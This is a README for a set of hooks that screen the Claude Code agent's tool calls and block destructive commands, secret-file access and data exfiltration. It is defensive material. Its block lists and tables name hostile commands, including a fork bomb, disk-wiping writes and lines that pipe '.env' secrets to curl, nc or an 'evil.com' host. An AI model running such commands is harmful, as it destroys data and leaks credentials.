# Claude Code Damage Control

Pre-tool-use hooks that protect your production environment from destructive commands when using Claude Code.

## What it does

Damage Control intercepts every tool call Claude Code makes **before** it executes, and blocks or asks confirmation for dangerous operations:

- **Bash hooks** — blocks `rm -rf`, `git push --force/-f`, `git reset --hard`, `dd`, fork bombs, `mv` on system paths, and 30+ destructive command variants
- **Exfiltration detection** — catches piping secrets to `curl`, `nc`, `scp`, `rsync`, DNS exfiltration, and base64-encoded data theft
- **Token scanning** — detects leaked AWS keys, Stripe tokens, GitHub PATs, OpenAI keys, private keys, and 15+ secret patterns in Write operations
- **Write/Edit hooks** — prevents overwriting secrets, protected files, and guards against empty-content overwrites on critical files
- **Read hooks** — blocks reading `.env`, `.ssh`, credentials, and other sensitive files via Read, Grep, and Glob tools
- **YAML config** — all patterns are configurable per project via `patterns.yaml`

## Defense in Depth

Damage Control is designed as **Layer 2** in a two-layer security system:

- **Layer 1: CLAUDE.md** — Instructions that tell Claude what NOT to do. The AI reads these and self-polices. First line of defense.
- **Layer 2: Hooks (this project)** — Automated safety net that catches anything that slips through Layer 1. Blocks commands before they execute.

Together they form defense in depth: Claude thinks first (Layer 1), the hooks catch mistakes (Layer 2).

## Quick install

```bash
# Clone into your project's .claude/hooks directory
git clone https://github.com/Prisodev/claude-code-damage-control.git /tmp/dc-install

# Copy hooks to your project
mkdir -p .claude/hooks
cp /tmp/dc-install/hooks/* .claude/hooks/

# Clean up
rm -rf /tmp/dc-install
```

Then add this to your `.claude/settings.local.json`:

```json
{
  "hooks": {
    "pre_tool_use": [
      {
        "matcher": "Bash",
        "hooks": [{ "type": "command", "command": "python3 .claude/hooks/bash-damage-control.py" }]
      },
      {
        "matcher": "Write|Edit|MultiEdit",
        "hooks": [{ "type": "command", "command": "python3 .claude/hooks/write-damage-control.py" }]
      },
      {
        "matcher": "Read|Grep|Glob",
        "hooks": [{ "type": "command", "command": "python3 .claude/hooks/read-damage-control.py" }]
      }
    ]
  }
}
```

## Configuration

Edit `hooks/patterns.yaml` to customize for your project:

```yaml
blocked_commands:      # Always blocked (non-regex patterns)
  - "> /dev/sda"
  - "mkfs"
  - ":(){ :|:& };:"
  - "git checkout -- ."

ask_commands:          # Requires user confirmation
  - "pm2 restart"
  - ".env"

zero_access_paths:     # No read, no write, no touch
  - ".env"
  - ".ssh"

read_only_paths:       # Can read, cannot write
  - ".claude/hooks/"

no_delete_paths:       # Cannot delete or overwrite with empty content
  - "CLAUDE.md"
  - ".claude/"
```

> **Note:** Most destructive commands (rm -rf, git push --force, git push -f, git reset --hard, git clean, etc.) are handled by regex patterns in the Python hooks, not by `blocked_commands`. This avoids false positives from substring matching.

## How it works

1. Claude Code calls a tool (Bash, Write, Read, Grep, Glob, etc.)
2. The pre_tool_use hook intercepts the call
3. The command/path/content is checked against `patterns.yaml` + regex patterns + token patterns
4. Decision: `allow` (proceed), `ask` (user confirms), or `block` (rejected)

### What gets caught

| Category | Examples |
|----------|----------|
| **Destructive commands** | `rm -rf`, `rm -r -f`, `find -delete`, `dd`, fork bombs, `mv /dev/null` |
| **Git dangers** | `git push --force`, `git push -f`, `git reset --hard`, `git clean -f`, `git checkout -- .` |
| **System commands** | `shutdown`, `reboot`, `kill -9`, `killall`, `chmod 777`, `chown -R` |
| **Data exfiltration** | `cat .env \| curl`, `env \| nc`, `scp .env user@evil.com`, DNS exfil |
| **Leaked secrets** | AWS keys (`AKIA...`), Stripe (`sk_live_`), GitHub PATs (`ghp_`), private keys |
| **Secret file access** | Reading/writing/grepping/globbing `.env`, `.ssh`, `credentials.json` |

### What's explicitly allowed

- `git push --force-with-lease` (the safe alternative)
- `.env.example` files (not secrets)
- Normal `mv`, `curl`, `wget`, `scp` on non-sensitive paths
- Token patterns in `.md`, `.txt`, `.yaml`, and test files (documentation/testing)

## v4 Changelog

**Bug fixes:**
- Fixed false positive: `rm -rf /tmp/cleanup` was blocked as `rm -rf /` (substring matching). All rm -rf variants now handled by regex.
- Fixed bypass: `git push -f` (short flag, no remote) was not caught by either substring or regex.
- Fixed false positive: `git push -f --force-with-lease` was blocked by substring match on `git push -f `.

**New features:**
- **Exfiltration detection** — 8 regex patterns catching secret piping to network tools, DNS exfil, base64 encoding
- **Token scanning** — 15+ patterns detecting leaked API keys/tokens in Write operations (AWS, Stripe, OpenAI, GitHub, GitLab, Slack, Google, Square, private keys)
- **Glob tool interception** — prevents discovering sensitive file paths via Glob
- **mv protection** — blocks `mv` on system paths (`/etc`, `/var`, `/usr`, `/boot`) and `mv ... /dev/null`
- **.env.example** now explicitly allowed in Write hook (was only allowed in Read)
- **Cleaned up patterns.yaml** — removed rm/git patterns that are better handled by regex (avoids false positives)

**Test suite:** 115 tests (was 47), covering all new features.

## Requirements

- Python 3.8+
- PyYAML (`pip install pyyaml`)

## Want a complete production setup?

These hooks are just the foundation. A full production Claude Code setup includes:

- Custom AI agent teams (builder + validator pattern)
- Automated skills for deploy, audit, and scaffolding
- Library sync across machines
- Telegram/WhatsApp monitoring bots
- CI/CD integration

Interested? Reach out: [Richard van Leeuwen on LinkedIn](https://www.linkedin.com/in/richard-van-leeuwen-93651a171/)

## License

MIT
